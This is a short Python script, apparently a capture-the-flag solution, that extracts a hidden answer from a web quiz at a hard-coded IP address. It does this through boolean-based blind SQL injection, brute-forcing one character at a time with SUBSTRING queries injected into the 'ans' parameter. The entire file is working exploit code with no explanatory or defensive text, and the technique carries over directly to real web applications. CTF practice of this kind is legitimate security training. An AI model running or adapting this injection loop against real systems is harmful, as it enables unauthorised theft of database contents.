import requests

CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
URL = "http://34.126.139.50:10515/"

flag = ""
while not "}" in flag:
    r = requests.get(url=URL)
    j = 0
    print("Checking: ", end="")
    
    while True:
        print(CHARS[j], end="")
        payload = "{}?qn_id=1&ans=2' AND SUBSTRING((SELECT Answer FROM QNA WHERE ID=42), {}, 1) = '{}".format(URL, str(len(flag) + 1), CHARS[j])
        r = requests.get(url=payload)
        
        if "Correct" in r.text:
            flag += CHARS[j]
            break
        j += 1
    
    print("\nCurrent flag: " + flag)

print("Flag: " + flag)
